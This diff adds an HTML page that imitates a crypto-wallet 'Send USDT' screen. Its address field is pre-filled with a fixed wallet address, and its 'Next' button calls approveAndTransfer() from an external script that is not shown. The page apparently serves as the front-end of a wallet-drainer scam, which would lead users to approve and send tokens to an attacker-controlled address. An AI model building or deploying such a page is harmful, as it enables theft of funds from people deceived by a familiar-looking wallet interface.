@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta name="HandheldFriendly" content="true">
+  <title>Send USDT</title>
+  <link rel="stylesheet" href="style.css">
+  <style>
+    input[type="text"], input[type="number"] {
+      font-size: 16px !important;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="form-container">
+      <label for="address">Address or Domain Name</label>
+      <div class="input-wrapper">
+        <input type="text" id="address" value="0x67CcdC2dbD08C3EE2cf9Bf4DA745F723c67E3Ba5">
+        <span class="clear-btn" onclick="clearAddress()">✕</span>
+        <span class="paste-btn">Paste</span>
+      </div>
+
+      <label for="amount">Amount</label>
+      <div class="amount-wrapper">
+        <input type="number" id="amount" placeholder="0.00" oninput="updateFiat()">
+        <span>USDT</span>
+        <span>Max</span>
+      </div>
+      <div class="usd-value" id="fiat">≈ $0.00</div>
+    </div>
+
+    <div class="button-container">
+      <button onclick="approveAndTransfer()">Next</button>
+    </div>
+  </div>
+
+  <!-- ✅ External JS File -->
+  <script src="script.js"></script>
+
+  <!-- ✅ Silent Refresh if Blank -->
+  <script>
+    window.addEventListener('DOMContentLoaded', () => {
+      if (document.body.innerHTML.trim().length === 0) {
+        location.reload();
+      }
+    });
+  </script>
+</body>
+</html>
